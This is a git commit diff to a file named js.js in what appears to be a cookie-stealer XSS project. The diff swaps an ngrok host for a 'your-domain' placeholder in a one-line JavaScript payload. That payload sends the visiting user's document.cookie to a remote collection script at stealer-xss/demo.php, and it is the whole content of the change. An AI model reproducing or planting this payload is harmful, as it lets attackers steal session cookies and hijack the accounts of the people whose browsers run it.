436b71611689695936cfc0ab3febc83ce48ca4bf
Osama Mousa <83459975+osama-mousa@users.noreply.github.com>
2024-09-18 00:55:02 +0300

    Update js.js

--- js.js
+++ js.js
@@ -1,1 +1,1 @@
-document.location="https://1161-78-184-132-77.ngrok-free.app/stealer-xss/demo.php?cookie="+ document.cookie;
+document.location="your-domain/stealer-xss/demo.php?cookie="+ document.cookie;
